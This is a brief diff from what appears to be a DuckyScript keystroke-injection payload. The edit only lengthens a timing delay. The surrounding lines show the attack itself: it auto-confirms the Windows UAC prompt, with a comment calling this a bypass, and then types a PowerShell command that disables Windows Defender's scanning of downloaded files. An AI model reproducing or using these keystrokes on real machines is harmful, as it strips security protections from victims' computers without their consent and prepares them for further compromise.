@@ -34,7 +34,7 @@ REM Select UAC window once it pops up
 DELAY 800
 ALT y
 REM Bypass UAC window
-DELAY 400
+DELAY 800
 STRING Set-MpPreference -DisableIOAVProtection $true
 ENTER
 DELAY 500
